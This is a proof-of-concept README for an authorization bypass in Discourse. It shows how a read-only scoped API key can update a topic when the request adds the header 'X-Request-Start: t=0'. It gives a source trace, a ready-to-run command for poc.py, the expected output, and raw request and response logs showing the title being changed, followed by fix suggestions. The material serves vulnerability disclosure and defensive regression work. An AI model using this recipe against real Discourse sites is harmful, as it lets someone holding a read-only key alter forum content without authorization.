# Discourse Scoped API Key Route Bypass PoC

This entry documents and exercises an authorization bypass in Discourse scoped API key handling.

A granular all-users API key limited to `topics:read` can be used to perform a topic update when the request carries an attacker-controlled `X-Request-Start` header that makes the request appear queued. The overload middleware authenticates the API request before Rails has routed it. During that pre-route check, the scoped API key matcher resolves the path without the real HTTP verb, accepts the request as the read route for the same topic path, and caches the current user in the Rack environment. The later `PUT /t/:topic_id.json` controller action then runs as that cached API user and updates the topic.

## Affected Target

- Product: Discourse
- Commit tested: `3dfcc8f884313da69711ed5f26f3749fb6516ef2`
- Runtime verified: stock Rails development server using `docker.io/discourse/discourse_dev:20260609-1222`
- Feature path: granular all-users API keys, overload middleware, route scope matching, topic update
- Required API key: all-users key with only the `topics:read` granular scope
- Required API username: a user that can edit the target topic
- Request primitive: caller-controlled `X-Request-Start` header

## Impact

The chain turns a read-scoped API key into a write-capable request for routes whose read and write actions share a path shape.

In the verified topic-update path, the API key was limited to `topics:read`. A normal `PUT /t/:topic_id.json` request using that key was rejected and left the title unchanged. The same request with `X-Request-Start: t=0` returned success and changed the topic title as the supplied API username.

Any writable route with a matching read route and a privileged API username should be reviewed for the same pre-route authorization pattern.

## Source Trace

Relevant source locations in Discourse at `3dfcc8f884313da69711ed5f26f3749fb6516ef2`:

| File | Behavior |
| --- | --- |
| `lib/middleware/processing_request.rb` | Parses `X-Request-Start` and stores queue time in the Rack environment |
| `lib/middleware/overload_protections.rb` | Treats a request as overloaded when queue time exceeds `reject_anonymous_min_queue_seconds` |
| `lib/middleware/overload_protections.rb` | Calls the current-user provider to decide whether an overloaded request is authenticated |
| `lib/auth/default_current_user_provider.rb` | Validates `Api-Key` and `Api-Username`, then writes the authenticated user into `_DISCOURSE_CURRENT_USER` |
| `app/models/api_key.rb` | Requires at least one attached scope to permit a granular key request |
| `app/models/api_key_scope.rb` | Maps `topics:read` to `topics#show`, `topics#feed`, `topics#posts`, and `topics#show_by_external_id` |
| `lib/route_matcher.rb` | Recognizes the request path before Rails routing has populated controller parameters |
| `lib/route_matcher.rb` | Calls `Rails.application.routes.recognize_path(request.path_info)` without passing the request method |
| `config/routes.rb` | Defines `GET /t/:id` as `topics#show` and `PUT /t/:topic_id` as `topics#update` |
| `app/controllers/topics_controller.rb` | `update` calls `guardian.ensure_can_edit!` and updates the topic as `current_user` |

The reachable path is:

```text
ProcessingRequest
  X-Request-Start creates a large queue-time value
OverloadProtections
  overloaded request asks whether API credentials authenticate
DefaultCurrentUserProvider
  lookup_api_user calls api_key.request_allowed?
ApiKeyScope#permits?
  RouteMatcher checks the request path
RouteMatcher#path_params_from_request
  recognize_path(path_info) resolves /t/:id.json as topics#show
DefaultCurrentUserProvider
  stores the API user in _DISCOURSE_CURRENT_USER
TopicsController#update
  uses current_user from the same Rack environment
```

## PoC Design

`poc.py` drives the stock HTTP API directly. It:

1. Reads the target topic title with the supplied scoped API key.
2. Sends a control `PUT /t/:topic_id.json` request without `X-Request-Start`.
3. Reads the title again and verifies the control request left it unchanged.
4. Sends the same `PUT /t/:topic_id.json` request with `X-Request-Start: t=0`.
5. Reads the title again and verifies the triggered request changed it to the requested value.
6. Prints and saves a JSON proof object.

The script uses Python standard library APIs only.

## Requirements

- Python 3.10 or newer
- Running stock Discourse from the tested source tree or release line
- One visible target topic
- One all-users API key with only the `topics:read` granular scope
- One API username with permission to edit the target topic

## Quick Run

Example local values:

- Discourse base URL: `http://127.0.0.1:3000`
- API username: `admin`
- topic id: `8`

Run:

```bash
python poc.py \
  --base-url http://127.0.0.1:3000 \
  --api-key '<topics-read-api-key>' \
  --api-username admin \
  --topic-id 8 \
  --new-title 'Scope bypass direct proof title' \
  --output proof.json
```

Expected output shape:

```json
{
  "controlWithoutHeader": {
    "blocked": true,
    "httpStatus": 403,
    "titleAfterRequest": "Scope bypass original title",
    "unchanged": true
  },
  "triggeredWithHeader": {
    "changed": true,
    "finalTitle": "Scope bypass direct proof title",
    "httpStatus": 200,
    "success": true
  },
  "ok": true
}
```

## Validation Run

The validation run used a clean Discourse checkout at `3dfcc8f884313da69711ed5f26f3749fb6516ef2`.

The site ran at `http://127.0.0.1:3000` using the stock development container image `docker.io/discourse/discourse_dev:20260609-1222`. The database was migrated from the stock tree. The seeded data contained one active admin account, one public topic, and one granular all-users API key with only `topics:read`.

Seeded topic:

```text
topic id: 8
initial title: Scope bypass original title
```

Control request:

```text
PUT /t/8.json
Api-Key: topics-read granular all-users key
Api-Username: admin
title=Control title should stay blocked

HTTP status: 403
title after request: Scope bypass original title
```

Triggered request:

```text
PUT /t/8.json
Api-Key: topics-read granular all-users key
Api-Username: admin
X-Request-Start: t=0
title=Scope bypass exploited title

HTTP status: 200
title after request: Scope bypass exploited title
```

The observed responses are recorded in `evidence/stock-http-validation.txt`.

The included `poc.py` was then run from this folder against the same stock server. It started from the topic title `Scope bypass exploited title`, verified a control `PUT` without `X-Request-Start` returned `403` and left the title unchanged, then verified a `PUT` with `X-Request-Start: t=0` returned `200` and changed the title to `Exploitarium direct proof title 20260703`.

## Fix Direction

- In pre-route scope checks, resolve the route with the actual HTTP request method.
- Avoid authenticating API keys inside overload handling in a way that leaves a current user cached for the later controller action.
- Treat client-supplied queue timing headers as trusted only after a reverse proxy boundary has normalized or replaced them.
- Add regression coverage for a read-scoped API key attempting `PUT /t/:topic_id.json` with an attacker-supplied queue timing header.

## Responsible Use

Use this PoC only for systems you own, systems you are authorized to test, and defensive regression work.
